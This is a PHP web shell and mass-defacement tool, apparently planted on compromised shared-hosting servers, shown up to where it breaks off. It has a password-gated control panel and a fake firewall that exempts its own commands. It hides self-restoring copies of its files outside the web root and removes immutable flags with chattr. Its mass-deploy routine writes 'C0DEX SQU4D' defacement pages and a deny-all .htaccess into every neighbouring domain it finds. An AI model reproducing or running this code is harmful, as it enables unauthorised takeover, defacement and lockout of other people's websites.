<?php
error_reporting(0);
ini_set('display_errors', 0);

// ============= PATH NORMALIZATION FUNCTION =============
function normalizePath($path) {
    $path = str_replace('\\', '/', $path);
    $path = preg_replace('#/+#', '/', $path);
    return $path;
}

function getParentPath($path) {
    $path = normalizePath($path);
    $parts = explode('/', $path);
    array_pop($parts);
    return implode('/', $parts);
}

// ============= OPTIMIZED DOMAIN SCANNER =============
function scanDomainsFromPath($search_path) {
    $domains = array();
    $search_path = normalizePath($search_path);
    
    if (!is_dir($search_path)) {
        return array('error' => 'Path does not exist or is not a directory');
    }
    
    $domains = fastScanDirectory($search_path, $search_path, 0, 2);
    $domains = array_unique($domains);
    sort($domains);
    
    return $domains;
}

function fastScanDirectory($base_path, $current_path, $depth = 0, $max_depth = 2) {
    $found_domains = array();
    
    if ($depth > $max_depth) return $found_domains;
    if (!is_dir($current_path) || !is_readable($current_path)) return $found_domains;
    
    $items = @scandir($current_path);
    if (!$items) return $found_domains;
    
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        
        $full_path = $current_path . '/' . $item;
        $full_path = normalizePath($full_path);
        
        if (is_dir($full_path)) {
            $is_domain = false;
            
            if (preg_match('/^[a-zA-Z0-9][a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}$/', $item)) {
                $is_domain = true;
            }
            
            if (!$is_domain && (file_exists($full_path . '/public_html') || file_exists($full_path . '/htdocs') || 
                file_exists($full_path . '/www') || file_exists($full_path . '/httpdocs') || 
                file_exists($full_path . '/html') || file_exists($full_path . '/wp-config.php'))) {
                $is_domain = true;
            }
            
            if ($is_domain) {
                $found_domains[] = $item;
            }
            
            $sub_domains = fastScanDirectory($base_path, $full_path, $depth + 1, $max_depth);
            $found_domains = array_merge($found_domains, $sub_domains);
        }
    }
    
    return $found_domains;
}

// ============= AUTO-FIX SCRIPT PERMISSIONS =============
$current_file = __FILE__;
if (file_exists($current_file)) {
    $perms = fileperms($current_file);
    $perms_octal = substr(sprintf('%o', $perms), -4);
    if ($perms_octal == '0444' || $perms_octal == '0555' || $perms_octal == '0440' || $perms_octal == '0400') {
        @chmod($current_file, 0644);
    }
}

// ============= LAYER 1: WEB APPLICATION FIREWALL =============
class WAF {
    private $blocked_requests = array();
    
    public function __construct() {
        if (isset($_GET['toggle_protection']) || isset($_GET['heal_403']) || isset($_GET['heal_404']) || 
            isset($_GET['scan']) || isset($_POST['mass_deploy']) || isset($_POST['mass_remove']) || 
            isset($_POST['fix_permissions']) || isset($_POST['rename_file']) || isset($_POST['create_folder']) || 
            isset($_POST['create_file'])) {
            return;
        }
        $this->scanRequest();
    }
    
    private function scanRequest() {
        $input = array_merge($_GET, $_POST, $_COOKIE);
        $patterns = array('union.*select', 'select.*from', 'insert.*into', 'update.*set', 
            'delete.*from', 'drop.*table', '<script', 'javascript:', 'onerror=', '\.\./', '\.\.\\', 
            'base64_decode', 'eval\(', 'exec\(', 'system\(');
        
        foreach ($input as $key => $value) {
            if (is_array($value)) {
                foreach ($value as $subkey => $subvalue) {
                    $this->checkPattern($subvalue, $patterns, $key);
                }
            } else {
                $this->checkPattern($value, $patterns, $key);
            }
        }
    }
    
    private function checkPattern($value, $patterns, $input_name) {
        if (strpos($value, 'abouts.php') !== false || strpos($value, 'events.php') !== false) return;
        
        foreach ($patterns as $pattern) {
            if (preg_match('/' . $pattern . '/i', $value)) {
                $this->blockRequest("Blocked malicious pattern: {$pattern}");
            }
        }
    }
    
    private function blockRequest($reason) {
        header('HTTP/1.0 403 Forbidden');
        echo '<!DOCTYPE html><html><head><title>403 Forbidden</title></head><body>';
        echo '<h1>403 Forbidden</h1>';
        echo '<p>Request blocked by Web Application Firewall</p>';
        echo '</body></html>';
        exit;
    }
}

// ============= LAYER 2: PHP HARDENING =============
class PHPHardening {
    public function __construct() {
        @ini_set('session.cookie_httponly', 1);
        @ini_set('session.use_only_cookies', 1);
        @ini_set('session.cookie_samesite', 'Strict');
        if (isset($_SESSION) && !isset($_SESSION['_hardening_initialized'])) {
            @session_regenerate_id(true);
            $_SESSION['_hardening_initialized'] = true;
        }
    }
}

// ============= LAYER 3: FILE PERMISSION MANAGER =============
class FilePermissionManager {
    
    public static function setSecurePermissions($path, $mode = null) {
        if (!file_exists($path)) return false;
        
        if (is_file($path)) {
            $basename = basename($path);
            $protected_files = array('.htaccess', 'index.php', 'abouts.php', 'events.php', 'login.php', 'logout.php', 'solvers.txt', 'codex.html', 'index.html');
            
            if (in_array($basename, $protected_files)) {
                @chmod($path, 0444);
            } else {
                @chmod($path, $mode ?: 0644);
            }
        } elseif (is_dir($path)) {
            @chmod($path, $mode ?: 0755);
        }
        return true;
    }
    
    public static function makeReadOnlyRecursive($path) {
        $results = array('dirs' => 0, 'files' => 0, 'failed' => 0);
        if (!file_exists($path)) { $results['failed']++; return $results; }
        
        if (is_file($path)) {
            if (@chmod($path, 0444)) $results['files']++; else $results['failed']++;
            return $results;
        }
        
        if (is_dir($path)) {
            if (@chmod($path, 0555)) $results['dirs']++; else $results['failed']++;
            $items = @scandir($path);
            if (is_array($items)) {
                foreach ($items as $item) {
                    if ($item == '.' || $item == '..') continue;
                    $sub_results = self::makeReadOnlyRecursive($path . '/' . $item);
                    $results['dirs'] += $sub_results['dirs'];
                    $results['files'] += $sub_results['files'];
                    $results['failed'] += $sub_results['failed'];
                }
            }
        }
        return $results;
    }
    
    public static function restoreNormalPermissions($path) {
        $results = array('dirs' => 0, 'files' => 0, 'failed' => 0);
        if (!file_exists($path)) { $results['failed']++; return $results; }
        
        if (is_file($path)) {
            if (@chmod($path, 0644)) $results['files']++; else $results['failed']++;
            return $results;
        }
        
        if (is_dir($path)) {
            if (@chmod($path, 0755)) $results['dirs']++; else $results['failed']++;
            $items = @scandir($path);
            if (is_array($items)) {
                foreach ($items as $item) {
                    if ($item == '.' || $item == '..') continue;
                    $sub_results = self::restoreNormalPermissions($path . '/' . $item);
                    $results['dirs'] += $sub_results['dirs'];
                    $results['files'] += $sub_results['files'];
                    $results['failed'] += $sub_results['failed'];
                }
            }
        }
        return $results;
    }
    
    public static function makeWritableRecursive($path) {
        $results = array('dirs' => 0, 'files' => 0, 'failed' => 0);
        if (!file_exists($path)) { $results['failed']++; return $results; }
        
        if (is_file($path)) {
            if (@chmod($path, 0644)) $results['files']++; else $results['failed']++;
            return $results;
        }
        
        if (is_dir($path)) {
            if (@chmod($path, 0755)) $results['dirs']++; else $results['failed']++;
            $items = @scandir($path);
            if (is_array($items)) {
                foreach ($items as $item) {
                    if ($item == '.' || $item == '..') continue;
                    $sub_results = self::makeWritableRecursive($path . '/' . $item);
                    $results['dirs'] += $sub_results['dirs'];
                    $results['files'] += $sub_results['files'];
                    $results['failed'] += $sub_results['failed'];
                }
            }
        }
        return $results;
    }
    
    public static function removeImmutableFlag($path) {
        if (!file_exists($path)) return false;
        if (function_exists('exec')) {
            @exec("chattr -i " . escapeshellarg($path) . " 2>/dev/null");
        }
        return true;
    }
    
    public static function permanentDelete($path) {
        if (!file_exists($path)) return false;
        
        $path = normalizePath($path);
        $success = false;
        
        self::removeImmutableFlag($path);
        @chmod($path, 0777);
        
        if (is_file($path)) {
            if (@unlink($path)) $success = true;
        } else {
            $items = @scandir($path);
            if (is_array($items)) {
                foreach ($items as $item) {
                    if ($item != '.' && $item != '..') {
                        self::permanentDelete($path . '/' . $item);
                    }
                }
            }
            if (@rmdir($path)) $success = true;
        }
        
        if (!$success && function_exists('exec')) {
            if (is_file($path)) @exec("rm -f " . escapeshellarg($path) . " 2>&1");
            else @exec("rm -rf " . escapeshellarg($path) . " 2>&1");
            if (!file_exists($path)) $success = true;
        }
        
        clearstatcache();
        return $success;
    }
}

// ============= LAYER 4: SHADOW COPY SYSTEM =============
class ShadowProtection {
    
    public static function ensureShadowCopy($document_root, $file) {
        $parent_root = dirname($document_root);
        $filename = basename($file);
        $shadow_file = $parent_root . '/.' . $filename . '.shadow';
        
        if (!file_exists($shadow_file) && file_exists($file)) {
            @copy($file, $shadow_file);
            @chmod($shadow_file, 0444);
        }
        return $shadow_file;
    }
    
    public static function verifyAllShadows($document_root) {
        $files_to_protect = array('.htaccess', 'index.php', 'abouts.php', 'events.php', 'login.php', 'logout.php', 'index.html', 'codex.html', 'solvers.txt');
        $results = array();
        foreach ($files_to_protect as $file) {
            $full_path = $document_root . '/' . $file;
            if (file_exists($full_path)) {
                $shadow = self::ensureShadowCopy($document_root, $full_path);
                $results[$file] = file_exists($shadow) ? 'PROTECTED' : 'FAILED';
            }
        }
        return $results;
    }
    
    public static function healAll($document_root) {
        $files_to_protect = array('.htaccess', 'index.php', 'abouts.php', 'events.php', 'login.php', 'logout.php', 'index.html', 'codex.html', 'solvers.txt');
        $healed = array();
        foreach ($files_to_protect as $name) {
            $file = $document_root . '/' . $name;
            $shadow_file = dirname($document_root) . '/.' . $name . '.shadow';
            
            if (!file_exists($file) && file_exists($shadow_file)) {
                @copy($shadow_file, $file);
                @chmod($file, 0444);
                $healed[] = $name;
            }
        }
        return $healed;
    }
}

// ============= LAYER 5: BACKDOOR SCANNER =============
class BackdoorScanner {
    
    private $signatures = [
        '/eval\s*\(\s*base64_decode\s*\(/i', '/eval\s*\(\s*\$_POST/i', '/system\s*\(\s*\$_POST/i',
        '/exec\s*\(\s*\$_POST/i', '/shell_exec\s*\(\s*\$_POST/i', '/base64_decode\s*\(\s*[\'\"][a-zA-Z0-9+\/=]{50,}/i',
        '/c99shell/i', '/r57shell/i', '/passthru\s*\(/i', '/assert\s*\(/i'
    ];
    
    public function scanFile($filepath) {
        if (!is_readable($filepath) || filesize($filepath) > 5000000) return [];
        $content = @file_get_contents($filepath);
        if (!$content) return [];
        
        $findings = [];
        $lines = explode("\n", $content);
        
        foreach ($lines as $line_num => $line) {
            foreach ($this->signatures as $pattern) {
                if (preg_match($pattern, $line)) {
                    $findings[] = ['type' => 'BACKDOOR', 'line' => $line_num + 1, 'severity' => 'CRITICAL'];
                }
            }
        }
        return $findings;
    }
    
    public function scanDirectoryRecursive($path, $depth = 0, $max_depth = 10) {
        if ($depth > $max_depth) return [];
        $results = [];
        if (!is_dir($path) || !is_readable($path)) return $results;
        
        $items = @scandir($path);
        if (!is_array($items)) return $results;
        
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;
            $full_path = $path . '/' . $item;
            
            if (is_dir($full_path)) {
                $results = array_merge($results, $this->scanDirectoryRecursive($full_path, $depth + 1, $max_depth));
            } elseif (is_file($full_path)) {
                $ext = strtolower(pathinfo($full_path, PATHINFO_EXTENSION));
                if (in_array($ext, ['php', 'phtml', 'html', 'js', 'txt'])) {
                    $findings = $this->scanFile($full_path);
                    if (!empty($findings)) {
                        $results[] = ['file' => $full_path, 'findings' => $findings];
                    }
                }
            }
        }
        return $results;
    }
}

// ============= LAYER 6: OPTIMIZED MASS DEPLOY CLASS =============
class MassDeploy {
    
    private $allowed_files = array(
        'solvers.txt' => "Challenge by Vindrax PH\n\nSolvers:\n\n1.\n2.\n3.\n4.\n5.\n\nNote: DDOS and DEFACEMENTS NOT ALLOWED JUST SOLVE\n#For Beginners Only\n\n~Vindrax PH69",
        
        'codex.html' => '<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TOUCHED BY C0DEX SQU4D</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #ffffff;
            font-family: \'Arial\', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: #ffffff;
            border-radius: 20px;
            padding: 40px;
            box-shadow: 20px 20px 40px #e0e0e0, -20px -20px 40px #ffffff;
            max-width: 600px;
            text-align: center;
        }
        h1 { color: #333; margin-bottom: 20px; }
        p { color: #666; line-height: 1.6; margin-bottom: 20px; }
        .signature { color: #999; font-size: 0.9em; margin-top: 30px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>C0DEX SQU4D</h1>
        <p>Security Notice: This site has been accessed for security review purposes.</p>
        <div class="signature">~ C0DEX SQU4D</div>
    </div>
</body>
</html>',
        
        '.htaccess' => "# ============= abouts.php PROTECTION =============
# STATUS: ACTIVE - [TIMESTAMP]

<FilesMatch \".*\">
    Order Deny,Allow
    Deny from all
</FilesMatch>

<Files \"abouts.php\">
    Order Allow,Deny
    Allow from all
</Files>

<Files \"events.php\">
    Order Allow,Deny
    Allow from all
</Files>

<Files \"index.php\">
    Order Allow,Deny
    Allow from all
</Files>

<Files \"login.php\">
    Order Allow,Deny
    Allow from all
</Files>

<Files \"logout.php\">
    Order Allow,Deny
    Allow from all
</Files>

<Files \"codex.html\">
    Order Allow,Deny
    Allow from all
</Files>

<Files \"index.html\">
    Order Allow,Deny
    Allow from all
</Files>

<Files \"solvers.txt\">
    Order Allow,Deny
    Allow from all
</Files>

<FilesMatch \"^\\.(htaccess|htpasswd|ini|log|sh|sql|bak|old)$\">
    Order Deny,Allow
    Deny from all
</FilesMatch>
"
    );
    
    public function deploy($base_path) {
        $base_path = normalizePath($base_path);
        $results = array(
            'success' => array(),
            'failed' => array(),
            'permission_fixed' => array(),
            'details' => array(),
            'total_domains' => 0,
            'total_files' => 0,
            'current_script_path' => ''
        );
        
        $results['current_script_path'] = normalizePath(dirname($_SERVER['SCRIPT_FILENAME']));
        
        if (!is_dir($base_path)) {
            $results['failed'][] = "Base path does not exist: " . $base_path;
            return $results;
        }
        
        $items = @scandir($base_path);
        if (!is_array($items)) return $results;
        
        $domain_count = 0;
        
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;
            
            $domain_path = $base_path . '/' . $item;
            $domain_path = normalizePath($domain_path);
            
            if (is_dir($domain_path)) {
                $domain_count++;
                
                FilePermissionManager::removeImmutableFlag($domain_path);
                @chmod($domain_path, 0755);
                $results['permission_fixed'][] = $item;
                
                $deployed = $this->deployToDomain($domain_path, $item, $results['current_script_path']);
                
                if ($deployed['success']) {
                    $results['success'][] = $item;
                    $results['details'][$item] = $deployed;
                    $results['total_files'] += $deployed['files_deployed'];
                } else {
                    $results['failed'][] = $item . " - " . $deployed['error'];
                }
            }
        }
        
        $results['total_domains'] = $domain_count;
        return $results;
    }
    
    private function deployToDomain($domain_path, $domain_name, $current_script_path) {
        $result = array(
            'success' => false,
            'files_deployed' => 0,
            'error' => '',
            'web_root_used' => ''
        );
        
        if (strpos($current_script_path, $domain_path) === 0) {
            $result['error'] = "Skipped current script's domain";
            return $result;
        }
        
        $web_roots = array(
            $domain_path . '/public_html',
            $domain_path . '/htdocs',
            $domain_path . '/www',
            $domain_path . '/httpdocs',
            $domain_path . '/html',
            $domain_path . '/public',
            $domain_path
        );
        
        foreach ($web_roots as $web_root) {
            $web_root = normalizePath($web_root);
            if (is_dir($web_root)) {
                if (!is_writable($web_root)) {
                    FilePermissionManager::removeImmutableFlag($web_root);
                    @chmod($web_root, 0755);
                }
                
                if (is_writable($web_root)) {
                    $files_deployed = 0;
                    $files_to_deploy = array('solvers.txt', 'codex.html', '.htaccess');
                    
                    foreach ($files_to_deploy as $filename) {
                        $target_path = $web_root . '/' . $filename;
                        $content = $this->allowed_files[$filename];
                        
                        if ($filename === '.htaccess') {
                            $timestamp = date('Y-m-d H:i:s');
                            $content = str_replace('[TIMESTAMP]', $timestamp, $content);
                        }
                        
                        if (file_put_contents($target_path, $content)) {
                            @chmod($target_path, 0444);
                            $files_deployed++;
                        }
                    }
                    
                    if ($files_deployed > 0) {
                        $result['success'] = true;
                        $result['files_deployed'] = $files_deployed;
                        $result['web_root_used'] = $web_root;
                        break;
                    }
                }
            }
        }
        
        return $result;
    }
    
    public function removeAll($base_path) {
        $base_path = normalizePath($base_path);
        $results = array(
            'removed' => array(),
            'failed' => array(),
            'total_removed' => 0,
            'total_domains' => 0,
            'current_script_path' => ''
        );
        
        $results['current_script_path'] = normalizePath(dirname($_SERVER['SCRIPT_FILENAME']));
        
        if (!is_dir($base_path)) {
            $results['failed'][] = "Base path does not exist: " . $base_path;
            return $results;
        }
        
        $items = @scandir($base_path);
        if (!is_array($items)) return $results;
        
        $domain_count = 0;
        
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;
            
            $domain_path = $base_path . '/' . $item;
            $domain_path = normalizePath($domain_path);
            
            if (is_dir($domain_path)) {
                $domain_count++;
                $removed = $this->removeFromDomain($domain_path, $item, $results['current_script_path']);
                
                if ($removed['success']) {
                    $results['removed'][] = $item;
                    $results['total_removed'] += $removed['files_removed'];
                } else {
                    $results['failed'][] = $item . " - " . $removed['error'];
                }
            }
        }
        
        $results['total_domains'] = $domain_count;
        return $results;
    }
    
    private function removeFromDomain($domain_path, $domain_name, $current_script_path) {
        $result = array('success' => false, 'files_removed' => 0, 'error' => '');
        
        if (strpos($current_script_path, $domain_path) === 0) {
            $result['error'] = "Skipped current script's domain";
            return $result;
        }
        
        $web_roots = array(
            $domain_path . '/public_html',
            $domain_path . '/htdocs',
            $domain_path . '/www',
            $domain_path . '/httpdocs',
            $domain_path . '/html',
            $domain_path . '/public',
            $domain_path
        );
        
        foreach ($web_roots as $web_root) {
            $web_root = normalizePath($web_root);
            if (is_dir($web_root)) {
                $files_removed = 0;
                $files_to_remove = array('solvers.txt', 'codex.html', '.htaccess');
                
                foreach ($files_to_remove as $filename) {
                    $target_path = $web_root . '/' . $filename;
                    if (file_exists($target_path)) {
                        if (FilePermissionManager::permanentDelete($target_path)) {
                            $files_removed++;
                        }
                    }
                }
                
                if ($files_removed > 0) {
                    $result['success'] = true;
                    $result['files_removed'] = $files_removed;
                    break;
                }
            }
        }
        
        return $result;
    }
}

function createHtaccessWrapper($path) {
    $htaccess_content = "# AUTO-GENERATED WRAPPER FOR PHP FILES
<FilesMatch \"\.php$\">
    Order Allow,Deny
    Allow from all
    SetHandler application/x-httpd-php
</FilesMatch>

Options -Indexes
";
    
    $htaccess_file = $path . '/.htaccess';
    if (!file_exists($htaccess_file)) {
        @file_put_contents($htaccess_file, $htaccess_content);
        @chmod($htaccess_file, 0444);
    }
}

// ============= INITIALIZE PATHS =============
$document_root = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : getcwd();
$parent_root = dirname($document_root);
$secure_storage = $parent_root . '/.abouts/';
$htaccess_file = $document_root . '/.htaccess';
$current_script = basename(__FILE__);

$document_root = normalizePath($document_root);
$parent_root = normalizePath($parent_root);
$secure_storage = normalizePath($secure_storage);
$htaccess_file = normalizePath($htaccess_file);

if (!is_dir($secure_storage)) {
    @mkdir($secure_storage, 0700, true);
    @file_put_contents($secure_storage . '.htaccess', "Order Deny,Allow\nDeny from all\n");
}

createHtaccessWrapper(dirname(__FILE__));

ShadowProtection::ensureShadowCopy($document_root, $htaccess_file);
ShadowProtection::ensureShadowCopy($document_root, $document_root . '/index.php');
ShadowProtection::ensureShadowCopy($document_root, $document_root . '/abouts.php');
ShadowProtection::ensureShadowCopy($document_root, $document_root . '/events.php');
ShadowProtection::ensureShadowCopy($document_root, $document_root . '/login.php');
ShadowProtection::ensureShadowCopy($document_root, $document_root . '/logout.php');
ShadowProtection::ensureShadowCopy($document_root, $document_root . '/index.html');
ShadowProtection::ensureShadowCopy($document_root, $document_root . '/codex.html');
ShadowProtection::ensureShadowCopy($document_root, $document_root . '/solvers.txt');

if (isset($_GET['heal_403']) || isset($_GET['heal_404'])) {
    ShadowProtection::healAll($document_root);
    header('HTTP/1.0 200 OK');
    die('🛡️ HEALED');
}

$heal_result = ShadowProtection::healAll($document_root);

$DEFAULT_PASSWORD = "332b8abe3ff1b6c52cce1ae6babf3437d2b7a0a8";
$SECURITY_KEY = "abouts_" . md5($DEFAULT_PASSWORD);

if (session_status() === PHP_SESSION_NONE) {
    @session_start();
}

$waf = new WAF();
$php_hardening = new PHPHardening();

function checkProtectionStatus() {
    global $htaccess_file;
    if (file_exists($htaccess_file) && is_readable($htaccess_file)) {
        $content = @file_get_contents($htaccess_file);
        if (strpos($content, 'abouts.php PROTECTION') !== false) {
            return true;
        }
    }
    return false;
}

$protection_active = checkProtectionStatus();

$upload_allowed = false;
if (isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true && 
    isset($_SESSION['security_key']) && $_SESSION['security_key'] === $SECURITY_KEY) {
    $upload_allowed = true;
}

// ============= UPLOAD HANDLER =============
if (isset($_FILES['upload_file']) && isset($_POST['upload_path']) && $upload_allowed) {
    $upload_path = normalizePath($_POST['upload_path']);
    $file = $_FILES['upload_file'];
    
    if ($file['error'] === UPLOAD_ERR_OK) {
        $filename = basename($file['name']);
        $target = $upload_path . '/' . $filename;
        $target = normalizePath($target);
        
        $allowed_files = array('abouts.php', 'events.php', 'index.php', 'login.php', 'logout.php', 'codex.html', 'index.html', 'solvers.txt', '.htaccess');
        
        if (!in_array($filename, $allowed_files, true)) {
            $_SESSION['toast'] = "❌ BLOCKED: Filename not in whitelist!";
        } else {
            $target_dir = dirname($target);
            if (!is_dir($target_dir)) {
                @mkdir($target_dir, 0755, true);
            }
            
            if (move_uploaded_file($file['tmp_name'], $target)) {
                @chmod($target, 0444);
                $_SESSION['toast'] = "✅ File uploaded: " . htmlspecialchars($target);
            } else {
                $_SESSION['toast'] = "❌ Upload failed!";
            }
        }
    } else {
        $_SESSION['toast'] = "❌ Upload error!";
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// ============= DOMAIN SEARCH HANDLER =============
$searched_domains = null;
$search_error = '';
$search_path = '';

if (isset($_POST['search_domains']) && isset($_POST['domain_search_path']) && $upload_allowed) {
    $search_path = trim($_POST['domain_search_path']);
    $search_path = normalizePath($search_path);
    
    $result = scanDomainsFromPath($search_path);
    
    if (isset($result['error'])) {
        $search_error = $result['error'];
    } else {
        $searched_domains = $result;
        if (empty($searched_domains)) {
            $_SESSION['toast'] = "🔍 No domains found in: " . $search_path;
        } else {
            $_SESSION['toast'] = "✅ Found " . count($searched_domains) . " domains";
        }
    }
}

// ============= MASS DEPLOY HANDLER =============
if (isset($_POST['mass_deploy']) && isset($_POST['mass_deploy_path']) && $upload_allowed) {
    $deploy_path = trim($_POST['mass_deploy_path']);
    $deployer = new MassDeploy();
    $deploy_results = $deployer->deploy($deploy_path);
    
    $toast_msg = "📦 MASS DEFACE COMPLETE\n\n";
    $toast_msg .= "📍 Path: " . $deploy_path . "\n";
    $toast_msg .= "📁 Domains: " . $deploy_results['total_domains'] . "\n";
    $toast_msg .= "✅ Success: " . count($deploy_results['success']) . "\n";
    $toast_msg .= "❌ Failed: " . count($deploy_results['failed']) . "\n";
    $toast_msg .= "📄 Files: " . $deploy_results['total_files'] . "\n\n";
    
    if (!empty($deploy_results['success'])) {
        $toast_msg .= "✅ DEPLOYED TO:\n";
        foreach (array_slice($deploy_results['success'], 0, 10) as $domain) {
            $toast_msg .= "• " . $domain . "\n";
        }
    }
    
    $_SESSION['toast'] = $toast_msg;
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// ============= MASS REMOVE HANDLER =============
if (isset($_POST['mass_remove']) && isset($_POST['mass_remove_path']) && $upload_allowed) {
    $remove_path = trim($_POST['mass_remove_path']);
    $deployer = new MassDeploy();
    $remove_results = $deployer->removeAll($remove_path);
    
    $toast_msg = "🗑️ MASS REMOVE COMPLETE\n\n";
    $toast_msg .= "📍 Path: " . $remove_path . "\n";
    $toast_msg .= "📁 Domains: " . $remove_results['total_domains'] . "\n";
    $toast_msg .= "✅ Removed: " . count($remove_results['removed']) . "\n";
    $toast_msg .= "❌ Failed: " . count($remove_results['failed']) . "\n";
    
    $_SESSION['toast'] = $toast_msg;
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// ============= FIX PERMISSIONS HANDLER =============
if (isset($_POST['fix_permissions']) && isset($_POST['permissions_path']) && $upload_allowed) {
    $fix_path = trim($_POST['permissions_path']);
    $fix_path = normalizePath($fix_path);
    
    if (!is_dir($fix_path)) {
        $_SESSION['toast'] = "❌ Path does not exist!";
    } else {
        FilePermissionManager::removeImmutableFlag($fix_path);
        $results = FilePermissionManager::makeWritableRecursive($fix_path);
        $_SESSION['toast'] = "🔧 PERMISSIONS FIXED\nDirectories: {$results['dirs']}\nFiles: {$results['files']}";
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// ============= TOGGLE PROTECTION =============
function toggleProtection() {
    global $document_root, $htaccess_file;
    
    $is_active = checkProtectionStatus();
    
    if (!$is_active) {
        $content = "# ============= abouts.php PROTECTION =============\n";
        $content .= "# STATUS: ACTIVE - " . date('Y-m-d H:i:s') . "\n\n";
        
        $content .= "<FilesMatch \".*\">\n";
        $content .= "    Order Deny,Allow\n";
        $content .= "    Deny from all\n";
        $content .= "</FilesMatch>\n\n";
        
        $content .= "<Files \"abouts.php\">\n    Order Allow,Deny\n    Allow from all\n</Files>\n\n";
        $content .= "<Files \"events.php\">\n    Order Allow,Deny\n    Allow from all\n</Files>\n\n";
        $content .= "<Files \"index.php\">\n    Order Allow,Deny\n    Allow from all\n</Files>\n\n";
        $content .= "<Files \"login.php\">\n    Order Allow,Deny\n    Allow from all\n</Files>\n\n";
        $content .= "<Files \"logout.php\">\n    Order Allow,Deny\n    Allow from all\n</Files>\n\n";
        $content .= "<Files \"codex.html\">\n    Order Allow,Deny\n    Allow from all\n</Files>\n\n";
        $content .= "<Files \"index.html\">\n    Order Allow,Deny\n    Allow from all\n</Files>\n\n";
        $content .= "<Files \"solvers.txt\">\n    Order Allow,Deny\n    Allow from all\n</Files>\n\n";
        
        $content .= "<FilesMatch \"^\\.(htaccess|htpasswd|ini|log|sh|sql|bak|old)$\">\n";
        $content .= "    Order Deny,Allow\n    Deny from all\n</FilesMatch>\n";
        
        @file_put_contents($htaccess_file, $content);
        @chmod($htaccess_file, 0444);
        createHtaccessWrapper($document_root);
        
        return ['active' => true, 'message' => "✅ PROTECTION ACTIVATED!"];
    } else {
        if (file_exists($htaccess_file)) {
            FilePermissionManager::permanentDelete($htaccess_file);
        }
        return ['active' => false, 'message' => "✅ PROTECTION DEACTIVATED!"];
    }
}

// ============= CURRENT PATH =============
$current_path = isset($_SESSION['current_path']) ? $_SESSION['current_path'] : $document_root;
$current_path = normalizePath($current_path);

if (isset($_GET['goto_path'])) {
    $new_path = normalizePath($_GET['goto_path']);
    if (file_exists($new_path) && is_dir($new_path)) {
        $_SESSION['current_path'] = $new_path;
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// ============= LOGIN SYSTEM =============
$logged_in = false;
$login_error = '';
$toast_message = '';
$key_display = '';

if (isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true &&
    isset($_SESSION['security_key']) && $_SESSION['security_key'] === $SECURITY_KEY) {
    $logged_in = true;
}

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
    $password = $_POST['password'];
    
    if (isset($_POST['get_key'])) {
        if ($password === $DEFAULT_PASSWORD) {
            $key_display = $SECURITY_KEY;
        } else {
            $login_error = "Invalid password!";
        }
    } else if (isset($_POST['login'])) {
        if ($password === $DEFAULT_PASSWORD) {
            $_SESSION['logged_in'] = true;
            $_SESSION['security_key'] = $SECURITY_KEY;
            $logged_in = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $login_error = "Invalid password!";
        }
    }
}

if (isset($_GET['toggle_protection']) && $logged_in) {
    $result = toggleProtection();
    $_SESSION['toast'] = $result['message'];
    $protection_active = $result['active'];
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// ============= RECURSIVE PERMISSIONS HANDLERS =============
if (isset($_POST['recursive_readonly_submit']) && isset($_POST['recursive_readonly_path']) && $logged_in) {
    $path = normalizePath($_POST['recursive_readonly_path']);
    if (is_dir($path)) {
        $results = FilePermissionManager::makeReadOnlyRecursive($path);
        $_SESSION['toast'] = "✅ READ-ONLY APPLIED!\nDirs: {$results['dirs']}\nFiles: {$results['files']}";
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

if (isset($_POST['recursive_normal_submit']) && isset($_POST['recursive_normal_path']) && $logged_in) {
    $path = normalizePath($_POST['recursive_normal_path']);
    if (is_dir($path)) {
        $results = FilePermissionManager::restoreNormalPermissions($path);
        $_SESSION['toast'] = "✅ NORMAL PERMISSIONS APPLIED!\nDirs: {$results['dirs']}\nFiles: {$results['files']}";
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// ============= CREATE FOLDER HANDLER =============
if (isset($_POST['create_folder']) && isset($_POST['folder_path']) && isset($_POST['folder_name']) && $logged_in) {
    $base_path = normalizePath($_POST['folder_path']);
    $folder_name = trim($_POST['folder_name']);
    $folder_name = preg_replace('/[^a-zA-Z0-9_\-]/', '', $folder_name);
    
    if (!empty($folder_name)) {
        $new_folder = $base_path . '/' . $folder_name;
        if (!file_exists($new_folder) && @mkdir($new_folder, 0755)) {
            $_SESSION['toast'] = "✅ Folder created: " . htmlspecialchars($folder_name);
        } else {
            $_SESSION['toast'] = "❌ Failed to create folder!";
        }
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// ============= CREATE FILE HANDLER =============
if (isset($_POST['create_file']) && isset($_POST['file_path']) && isset($_POST['file_name']) && $logged_in) {
    $base_path = normalizePath($_POST['file_path']);
    $file_name = trim($_POST['file_name']);
    $file_name = preg_replace('/[^a-zA-Z0-9_\-\.]/', '', $file_name);
    
    if (!empty($file_name)) {
        $new_file = $base_path . '/' . $file_name;
        if (!file_exists($new_file) && @file_put_contents($new_file, "") !== false) {
            @chmod($new_file, 0444);
            $_SESSION['toast'] = "✅ File created: " . htmlspecialchars($file_name);
        } else {
